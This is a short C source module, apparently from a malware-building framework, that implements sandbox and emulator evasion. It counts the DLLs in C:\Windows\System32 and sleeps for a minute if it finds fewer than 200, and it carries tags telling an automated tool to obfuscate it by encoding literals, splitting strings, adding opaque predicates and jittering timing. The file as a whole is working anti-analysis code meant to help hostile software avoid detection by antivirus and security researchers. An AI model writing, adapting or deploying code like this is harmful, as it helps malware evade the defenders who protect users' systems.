/* MODULE: ANTIEMULATION
 * TYPE: fsenum
 * DESC: Enumerates C:\Windows\System32\*.dll using FindFirstFile/FindNextFile.
 *       A real Windows install has 3000+ DLLs — emulators typically stub the
 *       filesystem and return 0-10 entries. Bails if fewer than MIN_DLL_COUNT
 *       files are found (indicates sandbox/emulator).
 * MUTATIONS: literal_encoding, timing_jitter, loop_restructuring
 */
#include "../header/definitions.h"

// @MUTATE:literal_encoding
#define MIN_DLL_COUNT 200

void antiemulation() {
    WIN32_FIND_DATAA fd;
    int count = 0;

    // @MUTATE:string_splitting
    // @MUTATE:literal_encoding
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\*.dll", &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;  // No filesystem access — probably emulated
    }

    // @MUTATE:loop_restructuring(do_while->while)
    do {
        count++;
        // @MUTATE:timing_jitter
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);

    // Real system: count >> 200. Emulator: count ~ 0-10.
    // @MUTATE:opaque_predicate
    // @MUTATE:literal_encoding
    if (count < MIN_DLL_COUNT) {
        // Stall — we're likely in an emulator
        // @MUTATE:timing_jitter
        Sleep(60000);
    }
}
